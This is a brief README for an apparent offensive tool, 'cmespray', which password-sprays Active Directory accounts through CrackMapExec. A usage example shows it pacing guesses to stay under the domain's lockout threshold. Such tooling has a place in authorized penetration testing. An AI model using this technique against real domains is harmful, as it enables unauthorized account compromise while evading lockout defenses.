# cmespray
Password spray Active Directory accounts with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) according to reset counter and lockout threshold policies

### Usage
```
[user::cmespray]$ ./cmespray.sh 
Enter the 'Reset Account Lockout Counter After' value: 15
Enter the 'Account Lockout Threshold' value: 3
Enter the Domain Controller IP Address: 192.168.1.100
Enter path to a password list: passwords.txt
Enter path to domain users list: users.txt
[*] Trying 2 passwords every 16 minutes against 192.168.1.100 and using passwords.txt and users.txt lists.
```
